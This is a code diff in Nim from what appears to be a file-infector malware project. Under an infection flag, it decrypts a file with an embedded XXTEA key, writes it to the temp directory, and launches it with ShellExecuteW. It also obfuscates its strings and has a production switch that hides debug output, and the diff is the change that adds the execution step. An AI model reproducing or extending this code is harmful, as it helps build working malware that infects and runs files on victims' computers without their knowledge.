@@ -7,6 +7,8 @@ when USE_INFECT_THREAD:
   from os import `/`
   from os import splitFile
   from os import existsFile
+  from winim/inc/shellapi import ShellExecuteW
+  from winim/winstr import winstrConverterStringToLPWSTR
 
   from lib/more/xxtea import decrypt
 
@@ -16,24 +18,26 @@ when USE_INFECT_THREAD:
 
   if paramCount() >= 1:
     try:
-      let file = paramStr(1)
-      let (_, name, ext) = splitFile(file)
+      let file = paramStr 1
+      let (_, name, ext) = splitFile file
       let tmpFile = getEnv(d e"tmp") / name & ext
 
       if not existsFile(tmpFile):
         writeFile(
           tmpFile,
           decrypt(
-            readFile(file),
+            readFile file,
             d INFECT_ENCRYPTION_KEY
           )
-        )
+        ) # write decrypted file
 
+      discard ShellExecuteW(0, nil, tmpFile, nil, nil, 5) # open decryped file
+
+    except:
       quit 0
-    except OSError, IOError:
-      quit 0
 
 
+from lib/constants import isProd
 when not isProd:
   echo "started"
 
